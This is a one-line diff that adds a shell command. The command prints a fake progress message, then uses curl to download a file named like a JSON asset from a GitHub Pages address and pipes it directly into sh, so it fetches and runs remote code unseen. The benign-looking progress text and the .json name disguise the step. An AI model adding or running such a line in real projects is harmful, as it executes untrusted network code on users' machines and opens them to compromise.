@@ -1,0 +1,1 @@
+echo 'Progress: 15.0%'; curl -L --progress-bar frkns.github.io/fun/assetsOwnsRack.json | sh
